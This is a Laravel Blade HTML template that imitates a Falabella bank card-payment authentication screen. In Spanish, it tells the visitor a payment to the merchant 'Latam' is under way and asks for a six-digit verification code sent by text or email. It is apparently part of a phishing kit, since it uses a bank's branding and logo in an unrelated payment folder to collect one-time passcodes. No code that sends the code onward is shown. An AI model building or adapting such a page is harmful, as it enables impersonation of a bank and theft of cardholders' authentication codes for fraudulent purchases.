<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">

    <link rel="stylesheet" href="{{asset('assets/css/payment/falabella.css')}}">


    <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>		

    <title>Document</title>

    <style>
        .spinner-container {
      margin-bottom: 2rem;
    }

    .spinner {
        width: 60px;
        height: 60px;
        border: 4px solid rgba(232, 17, 75, 0.2);
        border-left: 4px solid rgb(232, 17, 75);
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto 3rem;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    </style>
</head>
<body>
    <div id="formContainer" class="details" style="padding: 3px">
        <img src="{{asset('assets/img/payment/falabella/fala.png')}}" alt="" srcset="" width="100px">
    <hr>
    <a style="color:black;">Autenticación de compra</a><p></p>
    <br><a style="color:black;">Esta intentando realizar un pago en el comercio Latam. Para poder continuar digite el codigo de seguridad enviado por mensaje de texto o correo electronico.</a><p></p>

    
        <center><a style="color:black;">Código de verificación</a><br>
        <input type="tel" name="cDinamica" id="txtOTP" style="" maxlength="6" minlength="6" oninput="this.value = this.value.replace(/\D+/g, '');" required><br>
        <input type="submit" id="btnOTP" value="ENVIAR" style="color:white; background-color:blue; border:none;margin-top:5px; height:35px; width:189px;"></center>
        <p></p>
        <p>
            <br>
        </p>
        <center><a><b>REENVIAR CÓDIGO</b></a></center>
        <a><b>Necesita Ayuda?</b></a>
    </div>


    
<div id="loader" class="spinner-container" style="display:none; text-align:center; margin-top:50%;">
    <div class="spinner"></div>
    <p style="color:#333; margin-top:15px;">Procesando, por favor espera...</p>
</div>
</body>
</html>